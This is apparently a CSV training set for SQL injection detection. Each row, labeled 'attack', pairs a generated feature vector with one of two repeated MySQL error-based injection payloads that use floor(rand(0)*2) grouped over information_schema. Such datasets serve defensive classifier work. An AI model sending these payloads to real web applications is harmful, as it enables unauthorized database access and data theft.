id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_001722,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,5.6870064001448135,281.4552307128906,93.6401138305664,43.99246597290039,109.11793518066406,11.227550506591797,92.01152801513672,35.19266891479492,0.9448199272155762,0.36370211839675903,0.14566607773303986,0.37536925077438354,0.1332370787858963,3.7806012630462646,2.4390058517456055,0.8080217838287354,0.4727940261363983,0.2447078377008438,-0.6588819026947021,-0.23760950565338135,9.633051872253418,11.294556617736816,3.7943363189697266,0.2544580399990082,1.71262526512146,0.28515902161598206,-0.5461640357971191,0.474837064743042,0.12799473106861115,0.7991657853126526,0.3107430636882782,-0.04247717931866646,1.3642061948776245,0.16999565064907074,0.26419827342033386,2.1732239723205566,7.819267749786377,1.0999693870544434,2.652806282043457,0.37693724036216736,0.5323655605316162,1.1007535457611084,0.002157337963581085,-0.010773914866149426,-0.22637414932250977,0.23273563385009766,0.29799139499664307,0.4538435637950897,0.4212303161621094,0.38115745782852173,0.5410544276237488,0.4881380796432495,-0.07319484651088715,-0.08434081822633743,0.6176961064338684,0.17565374076366425,0.3630187511444092,0.15864548087120056,0.3599321246147156,-0.1842917501926422,-0.21208417415618896,0.3964778780937195,-0.058860912919044495,-0.16208890080451965,0.12829923629760742,-0.30616337060928345,0.5653925538063049,-0.05294834449887276,0.3169708847999573,0.19191676378250122,-0.09099787473678589,0.4474242627620697,0.4155675768852234,0.007444288581609726,0.3962620794773102,0.22300106287002563,0.3023442327976227,0.2329762876033783,-0.10941459983587265,0.07543160021305084,0.6631126403808594,11.462132453918457,0.5403251051902771,0.2659570574760437,0.07726012170314789,0.9440168738365173,-0.17967946827411652,0.17278160154819489,0.028828609734773636
GAN_001723,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.598963175140556,290.8443908691406,92.29509735107422,42.73732376098633,107.09795379638672,8.289334297180176,84.94788360595703,37.15615463256836,1.020108938217163,0.3399655818939209,0.14828002452850342,0.38060688972473145,0.13845020532608032,3.838117837905884,1.7057687044143677,0.7056241035461426,0.5678328275680542,0.17039108276367188,-0.2387661635875702,-0.2538268268108368,9.15994644165039,10.99006175994873,3.336228132247925,0.03794417902827263,1.8362829685211182,0.21802781522274017,-0.21899263560771942,0.39814651012420654,0.19248609244823456,0.8634526133537292,0.21849986910820007,-0.12052243947982788,1.5134450197219849,-0.09634534269571304,0.21389274299144745,2.22160005569458,8.417304992675781,1.0059503316879272,2.3969621658325195,0.551442563533783,0.4257945120334625,1.0901098251342773,-0.0639440193772316,-0.01654299534857273,-0.03704452887177467,0.160596564412117,0.10669663548469543,0.5598630309104919,0.3742526173591614,0.4819124639034271,0.44865062832832336,0.5170243382453918,0.02849629893898964,-0.001262466423213482,0.6290849447250366,0.11237628012895584,0.27754756808280945,0.14616313576698303,0.2973424792289734,-0.20593328773975372,-0.1456720530986786,0.2261851727962494,0.1320170760154724,-0.21161800622940063,-0.02374393492937088,-0.1735907346010208,0.600714921951294,-0.23698441684246063,0.12665089964866638,-0.010395880788564682,0.018792102113366127,0.19098000228405,-0.07069964706897736,-0.040570762008428574,0.30106884241104126,0.2137061059474945,0.6352576613426208,0.3632887601852417,-0.06616571545600891,0.0941537395119667,0.5584948658943176,10.400394439697266,0.6836209893226624,0.18707270920276642,0.06200198829174042,0.7749750018119812,-0.15397046506404877,0.061956487596035004,-0.045625194907188416
GAN_001724,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,5.62028724395246,291.966552734375,91.95761108398438,42.271705627441406,107.60824584960938,11.805091857910156,89.3819580078125,35.676082611083984,0.8590263724327087,0.3393343687057495,0.14900989830493927,0.37502995133399963,0.13873600959777832,3.7813820838928223,2.2910146713256836,0.7848532795906067,0.5176961421966553,0.24496185779571533,-0.6755082607269287,-0.33339887857437134,9.058854103088379,11.043242454528809,3.4485161304473877,0.15042366087436676,1.6944079399108887,0.20706848800182343,-0.6285359859466553,0.4969644248485565,0.14925818145275116,0.7372291684150696,0.44226688146591187,-0.05992119759321213,1.4081569910049438,0.09882098436355591,0.18228328227996826,2.1399054527282715,7.769027233123779,1.013504981994629,2.372326374053955,0.661527156829834,0.482975572347641,1.1285881996154785,0.03199741989374161,0.010199225507676601,-0.29843783378601074,0.28605347871780396,0.33244723081588745,0.5089850425720215,0.3480776846408844,0.3190159201622009,0.5122874975204468,0.3243369162082672,0.046373289078474045,-0.24895942211151123,0.6255081295967102,0.10062643885612488,0.4244716763496399,0.35786014795303345,0.4656752645969391,-0.12767310440540314,-0.09710448980331421,0.3958350121974945,-0.023178603500127792,-0.4043639302253723,0.02502686157822609,-0.4564887583255768,0.5101926326751709,-0.2178136557340622,0.12514957785606384,0.16403411328792572,-0.03399736061692238,0.6220751404762268,0.11705980449914932,-0.08769132941961288,0.4959167540073395,0.28840234875679016,0.26794305443763733,0.35141721367836,-0.11755450069904327,0.10068630427122116,0.7459201812744141,11.065179824829102,0.5650647282600403,0.20369452238082886,0.05225775018334389,0.9449102878570557,-0.20827755331993103,0.16024433076381683,-0.16550993919372559
GAN_001725,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,5.495564587414699,282.2410888671875,93.35514831542969,42.1357536315918,103.94087219238281,10.907909393310547,95.41071319580078,37.7674560546875,0.7436190843582153,0.34676092863082886,0.1533237248659134,0.376232385635376,0.137587770819664,3.846853733062744,2.3902876377105713,0.9487723112106323,0.5218709111213684,0.1770336627960205,-0.6380681991577148,-0.3765306770801544,9.290594100952148,11.043814659118652,3.8820736408233643,0.028231358155608177,1.6421141624450684,0.3360772430896759,-0.6203992366790771,0.5470067262649536,0.153021439909935,0.7222933769226074,0.26712316274642944,-0.22994770109653473,1.4434802532196045,0.07184309512376785,0.1795005202293396,2.1866822242736816,8.435164451599121,1.1184841394424438,2.6618990898132324,0.6200100183486938,0.5128474235534668,1.3193254470825195,-0.0913991630077362,-0.03335808962583542,-0.32655954360961914,0.20845633745193481,0.44347935914993286,0.503133237361908,0.2859468162059784,0.35363835096359253,0.42122477293014526,0.43465498089790344,-0.12222762405872345,-0.2956380248069763,0.6490062475204468,0.13504983484745026,0.4112100303173065,0.313972532749176,0.33692318201065063,-0.12633201479911804,-0.37442752718925476,0.33144697546958923,0.04609441012144089,-0.21015673875808716,-0.058084145188331604,-0.39318910241127014,0.6264169216156006,-0.050120022147893906,0.27290797233581543,0.2819099724292755,0.09972047060728073,0.4033457040786743,0.2068457454442978,0.04626373574137688,0.29012084007263184,0.3545672297477722,0.39985713362693787,0.2604805529117584,-0.16591766476631165,0.11790433526039124,0.5469256043434143,10.879746437072754,0.5538671612739563,0.1763181835412979,0.05576084926724434,0.9087209105491638,0.009884297847747803,0.19921551644802094,0.05046101287007332
GAN_001726,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.664800822740844,289.3949890136719,93.61737060546875,43.729217529296875,102.80643463134766,14.292404174804688,91.88298797607422,34.662818908691406,0.9710693359375,0.3644941747188568,0.1439601629972458,0.3808979094028473,0.12958449125289917,3.82239031791687,2.0966339111328125,0.8991767168045044,0.6481640338897705,0.23749107122421265,-0.4601750373840332,-0.17866550385951996,9.111140251159668,11.995746612548828,3.6895809173583984,0.04091549664735794,1.8532414436340332,0.37191203236579895,-0.361230731010437,0.31100574135780334,0.2298574149608612,1.0543451309204102,0.4943322539329529,-0.31431815028190613,1.6278784275054932,0.10385625064373016,0.2086755633354187,2.1817710399627686,7.849885940551758,0.9872519373893738,2.6099853515625,0.6182453036308289,0.5217579007148743,1.1170142889022827,0.08345453441143036,0.017043622210621834,0.01740235462784767,0.011054578237235546,0.1530511975288391,0.5248630046844482,0.2854524850845337,0.3748953938484192,0.4134387671947479,0.46342703700065613,-0.18643994629383087,-0.2274383157491684,0.5900730490684509,0.16196437180042267,0.30448657274246216,0.07738077640533447,0.39471179246902466,-0.5619217753410339,-0.46357813477516174,0.3208602964878082,0.04529932141304016,-0.320151686668396,0.11186898499727249,-0.367847204208374,0.5663577914237976,-0.30087849497795105,0.2590121030807495,0.12912626564502716,0.08995147049427032,0.23678341507911682,0.14674478769302368,-0.13822197914123535,0.4580225944519043,0.3315066993236542,0.536811351776123,0.27748769521713257,0.007475062273442745,0.09510434418916702,0.5715779662132263,11.393731117248535,0.6372105479240417,0.25727608799934387,0.06771709024906158,0.8333466053009033,0.07226719707250595,0.23782587051391602,-0.06684169918298721
GAN_001727,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.551516527580792,298.0702819824219,95.7741470336914,41.424652099609375,110.62053680419922,16.879552841186523,96.31737518310547,33.92129898071289,1.0569133758544922,0.3670743405818939,0.15462228655815125,0.3695235550403595,0.13548927009105682,3.870439052581787,2.0464577674865723,0.736495316028595,0.3929060995578766,0.2129819691181183,-0.7460152506828308,-0.27467450499534607,9.361279487609863,11.093708038330078,3.7870583534240723,0.08766959607601166,1.6929512023925781,0.3313593864440918,-0.5613765716552734,0.5438284873962402,0.10771233588457108,0.8697232604026794,0.5147871375083923,-0.10907185077667236,1.3024996519088745,0.22185224294662476,0.218157559633255,2.120288610458374,7.859460353851318,1.1906778812408447,2.245356321334839,0.4506371319293976,0.6703482270240784,1.2188113927841187,-0.049387477338314056,-0.022052207961678505,-0.09654606878757477,0.18412624299526215,0.36241546273231506,0.5004537105560303,0.2648494839668274,0.3989737331867218,0.5146697163581848,0.3924913704395294,-0.25916871428489685,-0.14325594902038574,0.6433065533638,0.15214504301548004,0.40936267375946045,-0.04804029315710068,0.46028611063957214,-0.4473455846309662,-0.07107070088386536,0.30754804611206055,-0.03425358608365059,-0.12032745033502579,0.30264562368392944,-0.3466866612434387,0.6308113932609558,0.0314570851624012,0.4360124468803406,0.19400358200073242,-0.1301386058330536,0.44211289286613464,0.2846701443195343,0.08888731896877289,0.4170001447200775,0.17062149941921234,0.4355735182762146,0.2147831916809082,-0.07679212093353271,0.02071313187479973,0.6715717315673828,11.546380043029785,0.6133244633674622,0.28484344482421875,0.0831405371427536,0.8619003891944885,0.07549626380205154,0.37487927079200745,0.03259878233075142
GAN_001728,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,5.810732284802743,294.053955078125,92.71333312988281,41.766204833984375,111.66996765136719,12.070853233337402,87.21102142333984,33.71223449707031,0.8598861694335938,0.3491373658180237,0.15392519533634186,0.3701367676258087,0.1397804319858551,3.8757240772247314,1.9699479341506958,1.0212541818618774,0.42650261521339417,0.30593591928482056,-0.6761909127235413,-0.5345202684402466,9.1171293258667,11.776206970214844,3.039536237716675,0.2026364803314209,1.6735944747924805,0.2975980043411255,-0.41894733905792236,0.4826759994029999,0.15359924733638763,0.6347434520721436,0.41188859939575195,-0.11530037224292755,1.2732791900634766,0.23571524024009705,0.21893242001533508,2.177192449569702,8.331473350524902,1.0867525339126587,2.3770833015441895,0.4183516502380371,0.5115906000137329,0.9980255961418152,0.05438734591007233,-0.02888111211359501,-0.25989750027656555,0.22444158792495728,0.3615439236164093,0.5542587637901306,0.3583243489265442,0.38723689317703247,0.5157590508460999,0.4796372652053833,-0.03375103697180748,-0.09387728571891785,0.6965696811676025,0.13939261436462402,0.43014273047447205,0.1088058352470398,0.3597678542137146,-0.3719909191131592,-0.22863848507404327,0.2517242133617401,0.0482947900891304,-0.01341850496828556,0.07300429046154022,-0.2566211223602295,0.6712843775749207,-0.09917469322681427,0.2955651879310608,0.07371529191732407,-0.16127774119377136,0.5331916213035583,0.2400134950876236,0.061903197318315506,0.39508336782455444,0.1636197566986084,0.3783084452152252,0.2511279582977295,-0.15936142206192017,0.06583309173583984,0.6515368223190308,11.299962997436523,0.5432553887367249,0.31050539016723633,0.06893287599086761,0.8531557321548462,0.006156317889690399,0.143801748752594,-0.11171554774045944
GAN_001729,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,5.746041624347836,288.4524230957031,94.29317474365234,40.431785583496094,100.0250244140625,17.10915184020996,96.15686798095703,32.336326599121094,0.9145119786262512,0.36108526587486267,0.15893559157848358,0.36684373021125793,0.1409790813922882,3.787858486175537,1.9211000204086304,0.8268901109695435,0.5495213866233826,0.21400274336338043,-0.9708118438720703,-0.2559703588485718,8.09427547454834,11.351271629333496,4.077678203582764,0.13092485070228577,1.579301118850708,0.3699082136154175,-0.7145227193832397,0.46059221029281616,0.19696477055549622,0.8285901546478271,0.6865628957748413,-0.2799755930900574,1.5616422891616821,0.08216363936662674,-0.045956242829561234,2.1893184185028076,7.456061363220215,1.2606048583984375,2.502185583114624,0.7719019651412964,0.7072641849517822,1.4298408031463623,-0.0604555681347847,-0.020010637119412422,-0.25035884976387024,0.3041893541812897,0.5609174370765686,0.4649370312690735,0.1665748506784439,0.35024893283843994,0.4905461072921753,0.20274420082569122,-0.27432066202163696,-0.17483767867088318,0.6257190704345703,0.054685916751623154,0.4938336908817291,0.14751043915748596,0.6270400881767273,-0.48270246386528015,-0.27084168791770935,0.3557490110397339,0.09598667919635773,-0.2943170666694641,0.02569003403186798,-0.34873872995376587,0.605080246925354,-0.18742932379245758,0.46129751205444336,0.3497006893157959,-0.016710832715034485,0.5975416302680969,-0.04320939630270004,0.0283438041806221,0.5788878202438354,0.24578511714935303,0.26678457856178284,0.2631087899208069,-0.2639053165912628,0.12252215296030045,0.6017057299613953,11.697611808776855,0.6585913896560669,0.26020216941833496,0.10079865157604218,0.9615510702133179,0.09459110349416733,0.31503522396087646,-0.28976067900657654
GAN_001730,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.399151639467163,290.78753662109375,91.6676025390625,44.99142837524414,109.74679565429688,13.302276611328125,91.03712463378906,34.30171585083008,0.9837653040885925,0.3550790846347809,0.14376619458198547,0.3757970333099365,0.12849834561347961,3.8394792079925537,2.256962776184082,0.8354327082633972,0.49757662415504456,0.19725361466407776,-0.42988184094429016,-0.16999216377735138,9.666441917419434,11.190559387207031,3.659705400466919,0.09943526983261108,1.7207014560699463,0.25336793065071106,-0.3991375267505646,0.24835675954818726,0.22408956289291382,0.8449779152870178,0.16335844993591309,-0.16516447067260742,1.6531697511672974,0.17682673037052155,0.2260439246892929,2.1975302696228027,8.030610084533691,1.0962707996368408,2.592500925064087,0.7039923071861267,0.5027731657028198,1.0552866458892822,0.02012133039534092,-0.02006964571774006,0.06833941489458084,0.29087525606155396,0.38328880071640015,0.3487430512905121,0.2877921462059021,0.3675655722618103,0.41831669211387634,0.44303449988365173,0.023004505783319473,-0.2661040425300598,0.5934168100357056,0.10603412240743637,0.38897544145584106,-0.0789676383137703,0.43569090962409973,-0.231010302901268,-0.5324305295944214,0.2954593896865845,-0.011315397918224335,-0.19253596663475037,0.007479719817638397,-0.023664161562919617,0.6379767656326294,-0.06099885329604149,0.22362372279167175,0.09208600223064423,-0.2195950150489807,0.3855912983417511,0.2350662797689438,-0.22786234319210052,0.48745718598365784,0.24483296275138855,0.48536819219589233,0.3170040547847748,0.06909608095884323,0.013355310074985027,0.7418185472488403,11.27585506439209,0.610569953918457,0.2749142646789551,0.09232565015554428,0.8634614944458008,0.027800612151622772,0.15740875899791718,0.05398114398121834
GAN_001731,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,5.570852631787227,298.8825988769531,97.4962387084961,40.8469123840332,105.85271453857422,16.178424835205078,96.0341567993164,34.33177185058594,0.9234329462051392,0.3709593713283539,0.15471670031547546,0.36717888712882996,0.14330749213695526,3.847626209259033,1.9774478673934937,0.7744023203849792,0.4737820327281952,0.1880691945552826,-0.8057852983474731,-0.07064186781644821,8.78445053100586,10.952831268310547,4.1670708656311035,-0.03622866049408913,1.6500821113586426,0.2819644510746002,-0.6421842575073242,0.2526291012763977,0.1359081268310547,0.6839293837547302,0.43445318937301636,-0.387130469083786,1.5419789552688599,0.26286783814430237,0.12104739993810654,2.1334848403930664,7.689272403717041,1.310336709022522,2.2060365676879883,0.6345816850662231,0.6508142948150635,1.1483025550842285,-0.18885087966918945,-0.027848927304148674,-0.35977622866630554,0.07527703791856766,0.4985121190547943,0.4777992069721222,0.3050396144390106,0.1910385638475418,0.5177183151245117,0.3422909080982208,-0.22142872214317322,-0.29705941677093506,0.6011449098587036,0.08827968686819077,0.45099112391471863,0.05103336647152901,0.4063889980316162,-0.5102143883705139,-0.4485936462879181,0.13058927655220032,-0.17973333597183228,-0.14378541707992554,0.19043847918510437,-0.10990768671035767,0.6965886354446411,-0.1529090404510498,0.41030555963516235,0.22296983003616333,-0.2573300004005432,0.5136759281158447,0.08880641311407089,0.001647748053073883,0.663006067276001,0.17936502397060394,0.2861001789569855,0.24372927844524384,-0.15738791227340698,0.04963502660393715,0.6710203289985657,11.706034660339355,0.47835081815719604,0.2630635201931,0.10163593292236328,0.8531681895256042,0.005215354263782501,0.12177877128124237,-0.3225439786911011
GAN_001732,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,5.475280128177071,282.78143310546875,93.10660552978516,42.248294830322266,107.15872192382812,17.918411254882812,93.61492156982422,33.86362075805664,1.1194627285003662,0.3701215088367462,0.15142495930194855,0.37104108929634094,0.13642363250255585,3.8301076889038086,2.0729875564575195,0.7355114817619324,0.42812156677246094,0.19713830947875977,-0.6244961619377136,-0.3087970018386841,9.121129035949707,10.653495788574219,3.694094657897949,0.1323501020669937,1.614355444908142,0.3485221564769745,-0.4883853495121002,0.3748328983783722,0.1846536099910736,0.6442822813987732,0.3538922667503357,-0.09646359086036682,1.7835334539413452,0.19217173755168915,0.1115100160241127,2.164215564727783,8.07645034790039,1.198047161102295,2.667839765548706,0.5723868012428284,0.5819686055183411,1.2092595100402832,-0.10243434458971024,0.001780831255018711,-0.24736759066581726,0.22357390820980072,0.5525320768356323,0.3948708772659302,0.2557027041912079,0.20937566459178925,0.41924744844436646,0.3761180341243744,-0.11576774716377258,-0.5345379710197449,0.5425146222114563,0.11866872012615204,0.3984224796295166,-0.0013880878686904907,0.2702054977416992,-0.12845295667648315,-0.4469339847564697,0.22609901428222656,0.017017297446727753,-0.1231188252568245,-0.027201831340789795,-0.12322423607110977,0.6637057662010193,0.048483893275260925,0.35280054807662964,0.12323661148548126,0.05785480886697769,0.4145704507827759,0.1512964814901352,0.05778619274497032,0.5707841515541077,0.22760960459709167,0.3482973873615265,0.34617385268211365,-0.14736105501651764,0.04789262264966965,0.7376395463943481,12.055088996887207,0.5686458349227905,0.21137189865112305,0.08672510832548141,0.9562699198722839,0.07473967224359512,0.0021265605464577675,-0.19884750247001648
GAN_001733,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,5.8600251774168575,298.5848693847656,91.6745376586914,42.088836669921875,114.56896209716797,14.359123229980469,86.34028625488281,38.26169967651367,1.0186933279037476,0.35023579001426697,0.1548645794391632,0.37234658002853394,0.14661858975887299,3.8285670280456543,2.2485921382904053,0.6728812456130981,0.47943615913391113,0.2809070944786072,-0.5974667072296143,-0.3778504729270935,8.83082103729248,11.297451972961426,3.3403689861297607,0.07062234729528427,1.6083146333694458,0.2608731985092163,-0.4943382441997528,0.45593178272247314,0.13242828845977783,0.5355978608131409,0.3441725969314575,-0.1525418907403946,1.300319790840149,0.10031507164239883,0.23545056581497192,2.212938070297241,8.228998184204102,0.9250153303146362,2.6237967014312744,0.6345052719116211,0.5426357388496399,1.0655583143234253,-0.012198660522699356,-0.013758721761405468,-0.3573237955570221,0.0721203088760376,0.214064821600914,0.5578833222389221,0.3197985291481018,0.3781413435935974,0.48404166102409363,0.507226288318634,-0.11547763645648956,-0.29514259099960327,0.5787956714630127,0.118402399122715,0.4060269892215729,0.1455056369304657,0.3506280779838562,-0.2923714518547058,-0.22421146929264069,0.4586741626262665,-0.10667359828948975,-0.16590523719787598,0.1232905387878418,-0.37772005796432495,0.6163527369499207,-0.2288183718919754,0.1283181607723236,0.08929423987865448,-0.1071343794465065,0.5207011103630066,0.09572531282901764,-0.06312645971775055,0.4937918484210968,0.15255554020404816,0.30150583386421204,0.35147079825401306,-0.20997431874275208,0.05782786384224892,0.6655083894729614,11.370176315307617,0.5576118230819702,0.20511510968208313,0.055243488401174545,0.8590046763420105,-0.07245971262454987,-0.01665922999382019,-0.08556865900754929
GAN_001734,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.382211807787681,290.88433837890625,92.64443969726562,40.61159133911133,104.08431243896484,13.762447357177734,89.06355285644531,34.69841766357422,0.9887004494667053,0.3480387032032013,0.15224897861480713,0.3766239583492279,0.1394299417734146,3.843451976776123,1.8880442380905151,0.696014940738678,0.39618104696273804,0.23925165832042694,-0.5908487439155579,-0.4340381324291229,8.513895034790039,10.179585456848145,3.504068613052368,0.019121721386909485,1.4832210540771484,0.28582480549812317,-0.526711106300354,0.37638965249061584,0.19105233252048492,0.6080260872840881,0.3580965995788574,-0.23450523614883423,1.5721516609191895,0.013554093427956104,0.10305417329072952,2.236178398132324,7.9630022048950195,1.2489652633666992,2.485403537750244,0.6324463486671448,0.4512569308280945,1.2122282981872559,0.02288457751274109,-0.016701659187674522,-0.1909182071685791,0.3424120247364044,0.6297255754470825,0.4411338269710541,0.2694900333881378,0.2412133663892746,0.34485191106796265,0.30551859736442566,-0.1094023734331131,-0.36657091975212097,0.6266058683395386,0.10272777825593948,0.40218448638916016,0.1527574509382248,0.3343736529350281,-0.3467964828014374,-0.350370317697525,0.20340164005756378,0.09749628603458405,-0.1481694132089615,0.07600937783718109,-0.1901082545518875,0.6585252285003662,-0.23031751811504364,0.20262737572193146,0.010995432734489441,-0.06710686534643173,0.328835129737854,-0.02370394766330719,-0.11016526818275452,0.46633416414260864,0.2624981701374054,0.5627027153968811,0.3748539090156555,-0.17922425270080566,-0.006500710733234882,0.6970424652099609,11.211648941040039,0.6029066443443298,0.2501388490200043,0.08196131139993668,0.9523911476135254,-0.07513178139925003,0.20870834589004517,-0.18499445915222168
GAN_001735,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,5.906223721029642,296.933349609375,87.7893295288086,42.61613464355469,106.3094711303711,16.347190856933594,89.68888854980469,36.736324310302734,1.1298279762268066,0.358696848154068,0.14903733134269714,0.3658478558063507,0.14386381208896637,3.826103448867798,2.34340763092041,0.7196889519691467,0.5531759858131409,0.38219791650772095,-0.8490682244300842,-0.7697669267654419,8.528054237365723,11.636578559875488,3.3627002239227295,0.10407350957393646,1.4559110403060913,0.3670857548713684,-0.48286759853363037,0.5175866484642029,0.2389838844537735,0.6816115975379944,0.4978099465370178,-0.15035240352153778,1.302761197090149,0.07581505924463272,0.1575477421283722,2.244865894317627,7.941683769226074,0.9697260856628418,2.944173574447632,0.820914089679718,0.6248817443847656,1.1474946737289429,0.08794976770877838,0.01450930256396532,-0.264492928981781,0.2740279734134674,0.5344979166984558,0.4541108012199402,0.14552368223667145,0.40857669711112976,0.4294202923774719,0.4430921673774719,-0.019914988428354263,-0.1898256242275238,0.6758686304092407,0.0676305890083313,0.47368988394737244,0.20201930403709412,0.46462246775627136,-0.3302692770957947,-0.33500826358795166,0.6059033274650574,-0.022013656795024872,-0.30393096804618835,-0.011171355843544006,-0.3036518394947052,0.5664930939674377,-0.29782453179359436,0.2533612549304962,0.11450241506099701,0.03923808038234711,0.535726010799408,0.10182341933250427,-0.07809601724147797,0.4285883605480194,0.2968197464942932,0.11680182814598083,0.3171970844268799,-0.24424389004707336,0.08652111887931824,0.6310420036315918,11.289668083190918,0.6061772704124451,0.25187575817108154,0.08516277372837067,0.9850413203239441,0.18684083223342896,0.16393208503723145,-0.035319872200489044
